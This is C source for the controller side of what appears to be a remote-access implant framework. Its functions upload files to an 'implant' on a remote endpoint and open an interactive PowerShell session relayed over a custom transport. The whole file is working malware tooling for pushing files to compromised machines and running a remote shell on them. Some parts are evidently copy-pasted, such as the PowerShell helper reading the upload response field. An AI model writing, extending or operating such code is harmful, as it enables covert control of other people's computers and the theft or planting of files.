#include<stdio.h>
#include<conio.h>

#include "tremont.h"

#include "../transport/transport.h"
#include "../endpoint/endpoint.h"
#include "../jobs/jobs.h"
#include "../cli/cli.h"
#include "../ctrl.h"


void _random_bytes_gen(char* buf, size_t buf_len) {
	for (size_t i = 0; i < buf_len; i++) {
		buf[i] = rand() % 256;
	}
}

int _req_new_thread(endpoint_id_t endpoint_id,
					tremont_stream_id* new_stream,
					struct bleeddial_ctx_t* ctx) {
	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	tremont_stream_id ctrl_stream = 0;

	EnterCriticalSection(&ctx->endpoint_db_cs);
	ctrl_stream = ctx->endpoint_db
		->endpoints_by_id[endpoint_id].ctrl_stream_id;
	LeaveCriticalSection(&ctx->endpoint_db_cs);

	tremont_stream_id stream_id;
	tremont_newid_nexus(new_stream, nexus);
	stream_id = *new_stream;

	struct ctrl_msg_t new_thread_ctrl_msg;
	new_thread_ctrl_msg.msg_enum = NEW_THREAD;
	
	struct new_thread_msg_t* new_thread_msg;
	new_thread_msg = &new_thread_ctrl_msg.new_thread;

	new_thread_msg->new_thread_enum = T_REQ;
	new_thread_msg->stream_info.stream_id = stream_id;
	_random_bytes_gen(new_thread_msg->stream_info.password,
		STREAM_PASS_LEN);

	tremont_auth_stream(stream_id,
		new_thread_msg->stream_info.password,
		STREAM_PASS_LEN,
		nexus
	);

	tremont_send(ctrl_stream, (byte*)&new_thread_ctrl_msg,
		sizeof(struct ctrl_msg_t), nexus);

	tremont_accept_stream(stream_id, 0, nexus);

	return 0;
}

int _est_upload_thread(endpoint_id_t endpoint_id,
				char* remote_path,
				size_t remote_path_len,
				int64_t file_len,
				tremont_stream_id* stream_id_ptr,
				struct bleeddial_ctx_t* ctx) {
	/*
		Have _req_new_thread create the worker thread
		Send wrkr_msg_t::download::req over the new stream
		recv the response on the same thread
		pass execution to the main thread function
	*/
	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id upload_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	upload_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	req.msg_enum = UPLOAD;

	struct upload_msg_t* upload_msg;
	upload_msg = &req.upload;
	upload_msg->msg_enum = REQ;

	struct upload_req_t* upload_req;
	upload_req = &upload_msg->req;

	memcpy(upload_req->dest_path, remote_path, remote_path_len);
	upload_req->dest_path_len = remote_path_len;
	upload_req->file_len = file_len;

	tremont_send(upload_stream, (byte*)&req, sizeof(req), nexus);
	
	struct wrkr_msg_t res;
	tremont_recv(upload_stream, (byte*) & res, sizeof(res), nexus);

	return res.upload.res.allowed == 1 ? 0 : -1;
}

DWORD WINAPI thread_upload(struct upload_params_t* params) {
	char alias_buf[255];
	int res = -1;

	EnterCriticalSection(&params->ctx.endpoint_db_cs);
	res = endpoint_id_alias(alias_buf,
							sizeof(alias_buf),
							params->endpoint_id,
							params->ctx.endpoint_db
	);
	if (res == -1)
		printf("Starting upload to implant %d...\n",
			params->endpoint_id);
	else
		printf("Starting upload to %s (%d)...\n",
			alias_buf,
			params->endpoint_id);

	HANDLE file_handle;
	file_handle = CreateFileA(params->local_path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	LARGE_INTEGER file_len;
	GetFileSizeEx(file_handle, &file_len);

	tremont_stream_id upload_stream;
	res = _est_upload_thread(params->endpoint_id,
		params->remote_path,
		params->remote_path_len,
		file_len.QuadPart,
		&upload_stream,
		&params->ctx
	);
	if (res == -1) {
		printf("Not allowed to create file on endpoint\n");
		return -1;
	}

	BOOL can_read = FALSE;
	int64_t total_sent = 0;
	int read_from_file = 0;
	char temp_buf[255];

	while (total_sent < file_len.QuadPart) {
		can_read = ReadFile(file_handle,
			temp_buf,
			sizeof(temp_buf),
			&read_from_file,
			NULL
		);
		/* if(can_read == false) goto FILE_ERROR; */
		tremont_send(
			upload_stream,
			temp_buf,
			read_from_file,
			params->ctx.transport_pcb->nexus
		);
		total_sent += read_from_file;
	}
	printf("Upload complete!\n");
	
	return 0;
}

int _est_powershell_stream(endpoint_id_t endpoint_id,
						   tremont_stream_id* stream_id_ptr,
						   struct bleeddial_ctx_t* ctx) {
	/*
		Have _req_new_thread create the worker thread
		Send wrkr_msg_t::download::req over the new stream
		recv the response on the same thread
		pass execution to the main thread function
	*/
	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;

	tremont_stream_id powershell_stream;

	_req_new_thread(endpoint_id,
		stream_id_ptr,
		ctx
	);
	powershell_stream = *stream_id_ptr;

	struct wrkr_msg_t req;
	req.msg_enum = POWERSHELL;

	struct powershell_msg_t* pwrsh_msg;
	pwrsh_msg = &req.powershell;
	pwrsh_msg->msg_enum = REQ;

	struct powershell_req_t* pwrsh_req;
	pwrsh_req = &pwrsh_msg->req;
	pwrsh_req->sanity = 1;

	tremont_send(powershell_stream, (byte*)&req, sizeof(req), nexus);

	struct wrkr_msg_t res;
	tremont_recv(powershell_stream, (byte*)&res, sizeof(res), nexus);

	return res.upload.res.allowed == 1 ? 0 : -1;
}

int sync_powershell(struct powershell_params_t* params) {
	struct bleeddial_ctx_t* ctx = params->ctx;

	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
	endpoint_id_t endpoint_id = params->endpoint_id;

	tremont_stream_id stream;
	int res = _est_powershell_stream(endpoint_id,
									 &stream,
									 ctx);
	if (res == -1) {
		printf("Couldn't establish a Powershell session");
	}

	tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);

	char temp_input[255];
	char temp_recv[255];
	int cur_char = 0;
	int input_len = 0;

	while (1) {
		memset(temp_recv, 0, sizeof(temp_recv));
		if (tremont_poll_stream(stream, nexus) == -1) break;
		tremont_recv(stream, temp_recv, sizeof(temp_recv), nexus);
		printf("%s", temp_recv);

		if (_kbhit()) {
			cur_char = getchar();

			if (cur_char == 3 || cur_char == EOF)
				break;

			if (cur_char == '\n') {
				temp_input[0] = '\r';
				temp_input[1] = '\n';
				temp_input[2] = 0;
				tremont_send(stream, temp_input, 2, nexus);
				continue;
			}

			temp_input[0] = (char)cur_char;
			fgets(temp_input + 1, sizeof(temp_input), stdin);
			strcat_s(temp_input, sizeof(temp_input), "\r\n");

			input_len = (int)strlen(temp_input);
			tremont_send(stream, temp_input, input_len, nexus);

			memset(temp_input, 0, input_len);
		}
	}

	tremont_end_stream(stream, nexus);
	
	EnterCriticalSection(&ctx->cli_info_cs);
	
	ctx->cli_info->cli_state = TONE;
	ctx->cli_info->guest_shell = NULL;
	ctx->cli_info->guest_shell_params = NULL;

	LeaveCriticalSection(&ctx->cli_info_cs);

	free(params);
	return 0;
}